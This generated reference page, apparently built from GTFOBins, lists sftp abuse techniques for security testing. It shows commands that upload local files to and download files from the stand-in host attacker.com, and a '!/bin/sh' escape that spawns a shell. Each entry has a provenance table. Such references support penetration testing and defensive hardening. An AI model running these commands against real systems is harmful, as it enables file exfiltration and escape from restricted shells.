---
parsed_by: focuslocust
source: commands
type: generated
---
# sftp Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## sftp

Tool page: [sftp](../../tools/linux/sftp.md)

### download

```text
sftp user@attacker.com
get /path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp` |
| Evidence | Function example preserved from source parser. |

### shell

```text
sftp user@attacker.com
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp` |
| Evidence | Function example preserved from source parser. |

### upload

```text
sftp user@attacker.com
put /path/to/input-file /path/to/output-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp` |
| Evidence | Function example preserved from source parser. |
